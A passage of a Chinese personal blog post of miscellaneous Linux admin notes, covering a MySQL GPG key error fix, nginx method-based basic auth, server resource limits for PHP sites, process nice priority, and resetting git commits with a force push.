<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-5.7.44-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY
</span></span><span class="line"><span class="cl">Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The GPG keys listed <span class="k">for</span> the <span class="s2">&#34;MySQL 5.7 Community Server&#34;</span> repository are already installed but they are not correct <span class="k">for</span> this package.
</span></span><span class="line"><span class="cl">Check that the correct key URLs are configured <span class="k">for</span> this repository.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Failing package is: mysql-community-libs-5.7.44-1.el7.x86_64
</span></span><span class="line"><span class="cl">GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql </span></span></code></pre></td></tr></table>
</div>
</div><p>解决:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 不行就删掉原来的GPG 密钥，在重新导入</span>
</span></span><span class="line"><span class="cl">$&gt; rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nginx配置特定方法请求时进行密码认证" class="heading-element"><span>nginx配置特定方法请求时进行密码认证</span>
  <a href="#nginx%e9%85%8d%e7%bd%ae%e7%89%b9%e5%ae%9a%e6%96%b9%e6%b3%95%e8%af%b7%e6%b1%82%e6%97%b6%e8%bf%9b%e8%a1%8c%e5%af%86%e7%a0%81%e8%ae%a4%e8%af%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl">    <span class="c1"># location  </span>
</span></span><span class="line"><span class="cl">    <span class="na">auth_basic &#34;Registry realm&#34;;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 指定除 HEAD 和 OPTIONS 方法外，其他方法都需要进行用户名/密码认证 </span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 注意： 此项设置在 docker registry 反向代理中可能不太适用，docker 在push的时候会先进行GET，如果GET没有要求认证</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 则 docker 在push的时候就会不在携带用户名/密码校验，从而导致推送失败</span>
</span></span><span class="line"><span class="cl">    <span class="na">limit_except HEAD OPTIONS {</span>
</span></span><span class="line"><span class="cl">        <span class="na">auth_basic_user_file conf.d/.htpasswd;</span>
</span></span><span class="line"><span class="cl">    <span class="na">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="服务器资源不够导致的问题" class="heading-element"><span>服务器资源不够导致的问题</span>
  <a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e8%b5%84%e6%ba%90%e4%b8%8d%e5%a4%9f%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>   由于服务器上的<code>php</code>站点经常受到攻击，于是决定重新调整环境架构，给上个开源<code>waf</code>，部署一切正常，但是在站点正式运行的时，某个站点在访问一个查询页面时候，数据库的<code>cpu</code>使用率消耗疯狂上涨(几百倍)，开始以为是站点被传木马了，一直疯狂查代码，查了很久发现，结果是服务器资源不够，停了一些站点重新分配了下每个容器的资源使用后，目前看起来稳定了，2核8G内存跑了近60个<code>php</code>站点，不知道这是个什么水准的服务器，还是我太水优化不了😂😂😂。</p>
<h2 id="通过systemd服务配置文件修改进程优先级" class="heading-element"><span>通过<code>systemd</code>服务配置文件修改进程优先级</span>
  <a href="#%e9%80%9a%e8%bf%87systemd%e6%9c%8d%e5%8a%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e4%bf%ae%e6%94%b9%e8%bf%9b%e7%a8%8b%e4%bc%98%e5%85%88%e7%ba%a7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>   在<code>[Service]</code> 下添加 <code>Nice=-10</code>。 <code>Nice</code> 进程优先级，<code>-20</code>-<code>19</code>, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 <code>sudo renice -n -10 -p &lt;pid&gt;</code>。可以通过<code>sudo nice -n -10 &lt;command&gt;</code> 直接在启动时指定</p>
<h2 id="git-删除最近几次提交记录" class="heading-element"><span>git 删除最近几次提交记录</span>
  <a href="#git-%e5%88%a0%e9%99%a4%e6%9c%80%e8%bf%91%e5%87%a0%e6%ac%a1%e6%8f%90%e4%ba%a4%e8%ae%b0%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 重置到指定提交 </span>
</span></span><span class="line"><span class="cl">$&gt;  git reset --hard &lt;commit id&gt;
</span></span><span class="line"><span class="cl"><span class="c1"># 重新提交当前修改内容 并提交 </span>
</span></span><span class="line"><span class="cl">$&gt; git add . <span class="o">&amp;&amp;</span> git comm -m <span class="s1">&#39;&lt;message&gt;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 强制重新推送到远程仓库 </span>
</span></span><span class="line"><span class="cl">$&gt; git push --force origin main
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 如果报错，原因可能就是 远程仓库禁止 强制推送 </span>
</span></span><span class="line"><span class="cl"><span class="c1"># 错误：无法推送一些引用到 xxxxxxxxx </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 报错要修改就只能开分支然后在推送，最后其申请合并 </span></span></span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2024-10-09 00:00:00">更新于 2024-10-09&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/linux/" class="post-tag" title="标签 - Linux">Linux</a><a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" class="post-tag" title="标签 - 解决方案">解决方案</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/" class="post-nav-item" rel="prev" title="那些杂七杂八的记录(二)"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>那些杂七杂八的记录(二)</a><a href="/posts/linux/shellscript%E7%9B%B8%E5%85%B3/" class="post-nav-item" rel="next" title="Shellscript相关">Shellscript相关<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="waline" class="comment"></div><noscript>
        Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/" rel="external nofollow noopener noreferrer">Waline</a>.
      </noscript></div></article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line"><div id="show-ip"></div><script>document.addEventListener("DOMContentLoaded", function () {fetch("https://ipinfo.io/json?token=c9716df22a6255").then(function (response) {return response.json();}).then(function (data) {document.getElementById("show-ip").innerHTML = data.ip;if (data.country !== "CN") {document.querySelectorAll(".footer-line.beian").forEach(function (el) {el.style.display = "none";});}}).catch(function (error) {document.getElementById("show-ip").innerHTML = "unknown";console.error("状态请求失败:", error);});});</script><script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y)})(window,document,"clarity","script","jtpwi0tdz1");</script></div><div class="footer-line">
        托管在&nbsp;<a title="Vercel" href="https://vercel.com" target="_blank" rel="noopener noreffer">Vercel</a> & <a title="Aliyun" href="https://www.aliyun.com" target="_blank" rel="noopener noreffer">Aliyun</a></div><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.134.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.14"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">
              <a href="https://blog.0x5c0f.cc"target="_blank" rel="external nofollow noopener noreferrer">0x5c0f</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></span></div><div class="footer-line beian"><span class="gov"><img src="/images/gov.png" style="height: 16px;width: 16px; display: inline-block;vertical-align: middle;margin-right: 3px;"/><a href="https://beian.mps.gov.cn/#/query/webSearch?code=50010602503871" rel="noreferrer" target="_blank">渝公网安备50010602503871</a></span><span class="icp footer-divider"><a href="https://beian.miit.gov.cn" target="_blank">渝ICP备2020011834号-2</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="--fi-progress-start: left; top: 0;"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/js/flyfish.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"waline":{"copyright":true,"dark":"html[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":false,"imageUploader":false,"lang":"zh-cn","login":"disable","meta":["nick","mail","link"],"pageSize":10,"search":false,"serverURL":"https://talk.51ac.cc","texRenderer":false}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":9000,"loop":false,"speed":100},"version":"v0.3.14"};</script><script src="/js/theme.min.js" defer></script></body>
</html>
